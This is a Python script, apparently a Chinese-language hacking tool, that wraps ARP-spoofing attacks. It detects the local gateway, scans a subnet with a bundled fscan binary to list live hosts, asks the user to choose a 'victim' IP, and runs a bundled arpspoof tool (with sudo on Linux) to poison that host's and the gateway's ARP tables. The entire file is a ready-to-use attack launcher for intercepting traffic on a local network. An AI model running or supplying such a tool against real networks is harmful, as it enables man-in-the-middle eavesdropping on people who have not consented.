import platform, subprocess
import re, os
import pyfiglet
import get_wifi_gateway_win, get_eth_gateway

if platform.system() == 'Linux':
  import get_wifi_gateway_linux
import sys

tips = """
参数解释：
        -wifi     : 自动获取wifi网卡的网关地址
        -ethernet : 自动获取以太网网卡的网关地址
        -gateway  : 手动指定网关地址
        -target   : 指定受害者IP
        -scan     : 指定要探测的网段<x.x.x.x/x>
        -wifi -p        : 打印网关地址
"""
usage = """
Usage:
python arp_spoof.py [-wifi | -ethernet] [-gateway <gateway ip>] -target <target ip> [-scan <scanning ip>]
"""
result = '---------------------------------结果输出---------------------------------'

def fro():
  print('========================================================================')
  # fonts = ["ansi_shadow","ansi_regular","avatar","banner3-D","bear","big","big_money-ne","big_money-nw","blocky","braced","univers","small_slant","doom","dos_rebel"]
  text = "Arp-spoofing"
  print(pyfiglet.figlet_format(text, font="slant"), end='')
  print('                                                             version:1.0')
  print('#' + '公众号:【Yuthon】' + '\n' + '  ~~~路漫漫其修远兮,吾将上下而求索~~~')
  print('========================================================================' + '\n' + tips + usage)


def parse_arguments():
  options = {
    "wifi": 0,
    "ethernet": 0,
    "gateway": None,
    "target": None,
    "scan_ip": None
  }
  args = sys.argv[1:]  # 获取除脚本名之外的参数
  fro()
  if len(args) == 0:
    sys.exit(1)
  else:
    if '-scan' not in args:
      if '-gateway' not in args:
        if '-wifi' not in args and '-ethernet' not in args:
          print('[Error] 请指定网关地址或使用选项自动获取')
          sys.exit(1)
        elif '-target' not in args and '-p' not in args:
          print('[Error] 请指定受害者的ip地址')
          sys.exit(1)
    else:
      pass
    try:
      # 提取参数值
      if '-wifi' in args:
        options["wifi"] = 1
      if '-ethernet' in args:
        options['ethernet'] = 1
      if '-gateway' in args:
        options["gateway"] = args[args.index('-gateway') + 1]
      if '-target' in args:
        options["target"] = args[args.index('-target') + 1]
      if '-scan' in args:
        options["scan_ip"] = str(args[args.index('-scan') + 1])
    except (ValueError, IndexError):
      print("[Error] 不合法的输入或空输入")
      sys.exit(1)
    return options


# 判断当前系统类别
def get_system_type():
  system = platform.system()
  if system == "Windows":
    return "Windows"
  elif system == "Linux":
    return "Linux"
  else:
    return "Other"


def win_gateway(options: dict):
  if options["wifi"] == 1:
    return get_wifi_gateway_win.get_wifi_gateway()
  elif options["ethernet"] == 1:
    return get_eth_gateway.get_default_gateway()
  else:
    return options['gateway']


def lin_gateway(options: dict):
  if options["wifi"] == 1 or options["ethernet"] == 1:
    return get_wifi_gateway_linux.get_default_gateway()
  else:
    return options['gateway']

def ip_scan_win(options: dict):
  cmd_str = ".\\tools\\fscan_1.7.0.exe -h" + ' ' + options['scan_ip']
  try:
    # 使用 Popen 执行命令，并捕获标准输出
    process = subprocess.Popen(
      cmd_str,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      encoding="gbk",
      errors='ignore'
    )
    # 获取命令的标准输出和标准错误
    stdout, stderr = process.communicate()

    # 检查输出是否为空
    if stdout:
      # print(f"命令输出：\n{stdout[:100]}...")  # 打印前100个字符，调试用
      # 使用正则表达式提取所有 IP 地址
      ip_alive = re.findall(r"\b\d+\.\d+\.\d+\.\d+\b", stdout)
      [ip_alive.append(item) for item in ip_alive if item not in ip_alive]
      index = 1
      for ip in ip_alive:
        print('第' + str(index) + '个存活ip :' + ip)
        index += 1
      print('[+]请使用 -target 指定你要攻击的受害者IP')
    else:
      print("[+]没有输出或发生错误。")
  except Exception as e:
    print(f"[Error]命令执行失败: {e}")


def ip_scan_lin(options: dict):
  cmd_str = os.path.join('.', 'tools', 'fscan_amd64_1.6')  # Linux 下的路径

  # 构造命令参数列表
  cmd_args = [cmd_str, '-h', options['scan_ip']]

  try:
    # 使用 subprocess.Popen 执行命令，并捕获标准输出和标准错误
    process = subprocess.Popen(
      cmd_args,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      encoding="utf-8",  # 使用 utf-8 编码
      errors='ignore'
    )

    # 获取命令的标准输出和标准错误
    stdout, stderr = process.communicate()

    # 检查输出是否为空
    if stdout:
      # 使用正则表达式提取所有 IP 地址
      ip_alive = re.findall(r"\b\d+\.\d+\.\d+\.\d+\b", stdout)

      # 去重：将列表转换为 set，去除重复的 IP
      ip_alive = list(set(ip_alive))

      # 输出存活的 IP 地址
      for index, ip in enumerate(ip_alive, start=1):
        print(f'第{index}个存活IP: {ip}')

      print('[+]请使用 -target 指定你要攻击的受害者IP')
    else:
      print("[+]没有输出或发生错误。")

  except Exception as e:
    print(f"[Error]命令执行失败: {e}")


def arp_attack_win(options: dict, gateway):
  if options.get("target"):
    cmd_str = ["python", ".\\tools\\arpspoof.py", "-t", options['target'], "-g", str(gateway)]
    print(f"执行命令: {cmd_str}")
    try:
      # 使用 subprocess.run 执行命令，直接同步输出到控制台
      result = subprocess.run(
        cmd_str,
        stdout=None,  # 将标准输出直接传递到当前终端
        stderr=None,  # 将标准错误直接传递到当前终端
        encoding="gbk",
        errors="ignore",
        check=True  # 如果命令失败，则抛出 CalledProcessError 异常
      )
      print("命令执行成功！")
    except subprocess.CalledProcessError as e:
      print(f"[Error] 命令执行失败，返回码: {e.returncode}")
    except Exception as e:
      print(f"[Error] 命令执行异常: {e}")

def arp_attack_lin(options: dict,gateway):
  if options.get("target"):
    cmd_str = ["sudo","./tools/arp_spoof",options['target'], "-g", str(gateway[0])]
    print(f"执行命令: {cmd_str}")
    try:
      # 使用 subprocess.run 执行命令，直接同步输出到控制台
      result = subprocess.run(
        cmd_str,
        stdout=None,  # 将标准输出直接传递到当前终端
        stderr=None,  # 将标准错误直接传递到当前终端
        encoding="gbk",
        errors="ignore",
        check=True  # 如果命令失败，则抛出 CalledProcessError 异常
      )
      print("命令执行成功！")
    except subprocess.CalledProcessError as e:
      print(f"[Error] 命令执行失败，返回码: {e.returncode}")
    except Exception as e:
      print(f"[Error] 命令执行异常: {e}")

def main():
  gateway = ''
  options = parse_arguments()
  system_type = get_system_type()
  # print(system_type)
  print(result)
  if system_type == "Windows":
    gateway = win_gateway(options)
    if options['scan_ip']:
      ip_scan_win(options)
    print("网关:"+str(gateway))
    arp_attack_win(options,gateway)
  elif system_type == "Linux":
    gateway = lin_gateway(options)
    print("网关:"+str(gateway[0]))
    if options['scan_ip']:
      ip_scan_lin(options)
    arp_attack_lin(options,gateway)

if __name__ == "__main__":
  main()
